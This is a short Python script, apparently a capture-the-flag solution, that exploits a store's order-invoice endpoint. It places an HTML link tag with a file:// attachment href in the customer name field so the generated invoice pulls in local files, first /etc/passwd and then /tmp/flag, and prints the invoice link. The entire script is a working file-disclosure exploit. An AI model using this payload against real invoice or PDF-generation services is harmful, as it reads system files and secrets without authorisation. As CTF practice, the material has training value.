from req import request

url = "https://task1.ctf.sekangur.pl/api/store/order"
file = "/etc/passwd"
payload1 = {
    "name": f"""<link rel=attachment href="file://{file}">""",
    "email": "youremail@example.com",
    "address": "123 Main St",
    "city": "City",
    "country": "Country",
    "zipCode": "ZIP",
    "cardNumber": "1234 5678 9101 1121",
    "expiryDate": "MM/YY",
    "cvv": "123"
}

if __name__ == "__main__":
    code, text = request(url, payload=payload1, method="PUT")
    if code == 200:
        payload2 = payload1.copy()
        file = "/tmp/flag"
        payload2["name"] = f"""<link rel=attachment href="file://{file}">"""

        code, text = request(url, payload=payload2, method="PUT")
        print(f"{code} -> https://task1.ctf.sekangur.pl/api/store/order/{text}/invoice")
